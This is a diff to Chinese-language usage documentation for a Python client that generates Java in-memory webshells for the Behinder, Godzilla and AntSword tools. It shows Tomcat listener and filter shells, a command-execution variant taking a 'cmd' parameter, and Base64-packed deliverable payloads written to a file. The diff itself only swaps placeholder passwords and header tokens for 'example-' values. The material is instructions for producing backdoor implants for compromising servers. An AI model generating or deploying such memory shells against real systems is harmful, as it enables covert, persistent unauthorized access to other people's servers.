@@ -20,8 +20,8 @@ with MemShellParty() as client:
         shell_tool="behinder",   # 不区分大小写
         shell_type="listener",
         jre=9,                   # Java/JRE 发行版本；≥9 时自动 byPassJavaModule=True
-        password="pass",         # 通用密码 → behinderPass
-        header_value="secret",   # 请求头门槛（默认 header_name=User-Agent）
+        password="example-pass",         # 通用密码 → behinderPass
+        header_value="example-token",    # 请求头门槛（默认 header_name=User-Agent）
     )
     payload = result["packResult"]           # 打包后的可投递字符串
     info = result["memShellResult"]          # 类名、尺寸、连接参数等
@@ -138,27 +138,35 @@ with MemShellParty() as client:
 
 | 写法 | 行为 |
 |------|------|
-| `password="x"` | 按当前 `shell_tool` 映射到冰蝎 / 哥斯拉 / 蚁剑的 `*Pass` |
-| `key="k"` | 写入哥斯拉 `godzillaKey`（其它工具一般无意义） |
+| `password="example-pass"` | 按当前 `shell_tool` 映射到冰蝎 / 哥斯拉 / 蚁剑的 `*Pass` |
+| `key="example-key"` | 写入哥斯拉 `godzillaKey`（其它工具一般无意义） |
 | `behinder_pass` / `godzilla_pass` / `godzilla_key` / `ant_sword_pass` | 高级：专用字段优先于通用 `password` / `key`（日常用通用即可） |
 | 密码类留空 | 服务端随机生成，结果在 `memShellResult.shellToolConfig` 中回传 |
 | `header_name` + `header_value` | 匹配该请求头后才进入马逻辑；`header_value` 常需自行设定 |
 
 ```python
 # 通用写法
-client.generate(shell_tool="Behinder", password="p1", header_value="tok")
+client.generate(
+    shell_tool="Behinder",
+    password="example-pass",
+    header_value="example-token",
+)
 
 # 哥斯拉
 client.generate(
     shell_tool="Godzilla",
     shell_type="Filter",
-    password="pass",
-    key="key",
-    header_value="tok",
+    password="example-pass",
+    key="example-key",
+    header_value="example-token",
 )
 
 # 专用字段覆盖通用 password
-client.generate(shell_tool="Behinder", password="ignored", behinder_pass="real")
+client.generate(
+    shell_tool="Behinder",
+    password="example-unused-pass",
+    behinder_pass="example-override-pass",
+)
 ```
 
 ### 参数对照表
@@ -213,7 +221,7 @@ payload = result["packResult"]
 mem = result["memShellResult"]
 print(mem["shellClassName"], mem["injectorClassName"])
 print(mem["shellSize"], mem["injectorSize"])
-print(mem["shellToolConfig"])  # 含实际密码等（若曾留空随机）
+print(mem["shellToolConfig"])  # 密码留空时会包含服务端生成的连接凭证
 ```
 
 若只要紧凑元信息、不要大段 `packResult`，可用：
@@ -239,9 +247,9 @@ with MemShellParty() as client:
         shell_type="Filter",
         jre=8,
         url_pattern="/*",
-        password="admin",
+        password="example-pass",
         header_name="User-Agent",
-        header_value="Mozilla/5.0-mem",
+        header_value="example-token",
         packer="DefaultBase64",
     )
     open("payload.txt", "w", encoding="utf-8").write(r["packResult"])
@@ -259,7 +267,7 @@ with MemShellParty() as client:
         command_param_name="cmd",
         encryptor="RAW",
         implementation_class="RuntimeExec",
-        header_value="x",
+        header_value="example-token",
     )
 ```
 
@@ -268,7 +276,10 @@ with MemShellParty() as client:
 ```python
 body = {
     "shellConfig": {"server": "Tomcat", "shellTool": "Behinder", "shellType": "Listener"},
-    "shellToolConfig": {"behinderPass": "p", "headerValue": "h"},
+    "shellToolConfig": {
+        "behinderPass": "example-pass",
+        "headerValue": "example-token",
+    },
     "injectorConfig": {"urlPattern": "/*"},
     "packer": "DefaultBase64",
 }
@@ -281,7 +292,12 @@ result = client.generate(body=body, jre=9)
 ```python
 from wtfutil.memshellutil import build_generate_body
 
-req = build_generate_body(shell_tool="Godzilla", password="p", key="k", header_value="h")
+req = build_generate_body(
+    shell_tool="Godzilla",
+    password="example-pass",
+    key="example-key",
+    header_value="example-token",
+)
 result = client.generate(body=req)
 ```
 
